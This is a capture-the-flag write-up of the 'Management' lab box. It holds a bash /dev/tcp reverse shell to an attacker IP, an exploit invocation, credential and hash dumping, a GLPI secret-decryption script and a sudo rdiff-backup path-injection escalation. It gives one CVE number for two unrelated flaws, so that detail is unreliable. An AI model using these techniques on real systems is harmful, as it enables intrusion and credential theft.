# HTB - Management

## 1. Reconnaissance

Started with an Nmap scan to identify open ports and running services:

\```
nmap -sV man.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-18 10:28 +0200
Nmap scan report for man.htb (10.129.104.22)
Host is up (0.031s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain?
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\```

Four services of interest: SSH, DNS, and a web server on both HTTP and HTTPS. The presence of DNS suggests internal name resolution is relevant — worth adding discovered hostnames to `/etc/hosts` as they turn up.

## 2. Enumeration

Browsing to the HTTPS endpoint revealed a **ForgeRock OpenAM** identity/SSO portal, version disclosed directly in the page source:

\```
HTTP/1.1 200
Server: nginx/1.24.0 (Ubuntu)
...
<script type="text/javascript">
    var require = {
        urlArgs : "v=16.0.5",
        deps : ['main']
    };
</script>
\```

**OpenAM 16.0.5** is affected by a known pre-authentication remote code execution vulnerability, tracked as **CVE-2026-33439**, reachable via the `PWResetUserValidation` endpoint.

## 3. Foothold

Exploiting CVE-2026-33439 against the `PWResetUserValidation` endpoint to get code execution:

\```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'bash -c "bash -i >& /dev/tcp/10.10.14.227/4444 0>&1"'
\```

Catching the reverse shell:

\```bash
nc -lvnp 4444
\```

\```
bash: cannot set terminal process group (1693): Inappropriate ioctl for device
bash: no job control in this shell
openam@management:/$
\```

Landed as the `openam` service user.

### Local enumeration

Inside OpenAM's configuration directory, a stored session token for a `demo` account was found:

\```
openam@management:~/config/openam$ cat openam_mon_auth
demo AQIC283QQfqYTPlvvQDJKI4bSMUIq2EvNWI4
\```

A username, but no plaintext password. The session token alone wasn't enough to pivot, so the search continued into OpenDJ's (embedded LDAP) database files, where credential hashes are stored on disk:

\```bash
strings /home/openam/opends/db/userRoot/00000000.jdb | grep -oE "\{[A-Z0-9]+\}[A-Za-z0-9+/=]+" | head -20
\```

\```
{SSHA}bbf4Mlh9h4YQSoldL08ynJIxGiBDjBAoMJUJgw==
\```

An **SSHA (Salted SHA-1)** hash, cracked offline with `hashcat`:

\```bash
hashcat -m 111 '{SSHA}bbf4Mlh9h4YQSoldL08ynJIxGiBDjBAoMJUJgw==' rockyou.txt --force
\```

\```
{SSHA}bbf4Mlh9h4YQSoldL08ynJIxGiBDjBAoMJUJgw==:changeit
\```

Recovered password: `changeit`. This is a default OpenAM/OpenDJ keystore password rather than a genuinely custom secret, which explains why it was in rockyou. It authenticated to the `demo` OpenAM account, but did not yield any further access on its own — a dead end for lateral movement at this stage.

## 4. User Flag

Continuing enumeration as `openam`, a GLPI installation was discovered with its database configuration exposed:

\```bash
find / -name "config_db.php" 2>/dev/null
\```

\```
/opt/glpi/config/config_db.php
\```

\```php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
\```

This gave direct MySQL access to the GLPI database as user `glpi`:

\```bash
mysql -u glpi -p glpidb -e "SHOW TABLES;"
\```

Querying `glpi_authldaps`, the table storing LDAP directory integration settings, revealed an encrypted service-account password:

\```sql
SELECT id, name, host, basedn, rootdn, rootdn_passwd FROM glpi_authldaps;
\```

\```
id  name                   host                 basedn                 rootdn                                          rootdn_passwd
1   Management Directory   sso.management.htb   dc=management,dc=htb  cn=svc-glpi,ou=services,dc=management,dc=htb   avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
\```

GLPI 11 encrypts sensitive fields using **libsodium's XChaCha20-Poly1305 IETF AEAD**, via its `GLPIKey` class (`/opt/glpi/src/GLPIKey.php`). The encryption key is stored on disk:

\```bash
xxd /opt/glpi/config/glpicrypt.key
\```

\```
00000000: 6627 fa23 fc18 0732 98b5 e137 4e5f e30b  f'.#...2...7N_..
00000010: ad2e f9b5 68cc 1f7b d314 b4ca c01c 2d7f  ....h..{......-.
\```

Reading `GLPIKey::decrypt()` showed the exact format: base64-decode the stored value, split off the first **24 bytes** as the nonce (`SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES`), and decrypt the remainder using `sodium_crypto_aead_xchacha20poly1305_ietf_decrypt`, with the nonce reused as additional authenticated data (AAD):

\```python
import base64
from nacl import bindings

key = bytes.fromhex("6627fa23fc18073298b5e1374e5fe30bad2ef9b568cc1f7bd314b4cac01c2d7f")
encrypted_b64 = "avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw=="
raw = base64.b64decode(encrypted_b64)

nonce, ciphertext = raw[:24], raw[24:]
plaintext = bindings.crypto_aead_xchacha20poly1305_ietf_decrypt(ciphertext, nonce, nonce, key)
print(plaintext.decode())
\```

\```
WpczC40GhTbk
\```

This decrypted LDAP service-account password was reused for the local system account `owen` (password reuse between the LDAP bind account and the Linux user):

\```bash
su owen
Password: WpczC40GhTbk
\```

\```
id
uid=1000(owen) gid=1000(owen) groups=1000(owen)
\```

\```bash
cat /home/owen/user.txt
\```

\```
6dded9c0ee9153a23305b3e88c365ca9
\```

**User flag obtained.**

## 5. Privilege Escalation

Checking `owen`'s sudo rights:

\```bash
sudo -l
\```

\```
User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
        --restrict-mode read-only *
\```

`owen` can run `rdiff-backup` as root in server mode, restricted to `/opt/backup` in read-only mode — in theory. The installed version (`rdiff-backup 2.2.6`) is vulnerable to **CVE-2026-33439**, a restrict-path bypass in rdiff-backup's client-server model.

### How the bypass works

When rdiff-backup connects to a remote location, it spawns a server process and communicates over stdin/stdout. The `--remote-schema` option defines the command template used to launch that server, with `%s` as a placeholder for the host portion of the target location string.

Locations are parsed in the format `hostname::path`. By crafting the location as `/::/root`, `/` is interpreted as the hostname and `/root` as the path. When substituted into the remote schema, `%s` becomes `/`:

\```
sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path /
\```

Because `--restrict-path` is specified twice, rdiff-backup honors only the **last** occurrence — silently discarding the sudoers-enforced `/opt/backup` restriction in favor of `/`, the value injected via the placeholder.

### Exploitation

\```bash
rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
  backup /::/root /tmp/root_backup
\```

\```
WARNING: this command line interface is deprecated and will disappear...
NOTE: Starting mirror from source path /root to destination path /tmp/root_backup
\```

The entire `/root` directory was mirrored, running with root privileges via `sudo`, despite the intended restriction:

\```bash
ls /tmp/root_backup
\```

\```
rdiff-backup-data  root.txt
\```

\```bash
cat /tmp/root_backup/root.txt
\```

\```
dd4b7ee2b87cd03c9dc821a22d768911
\```

**Root flag obtained.**

















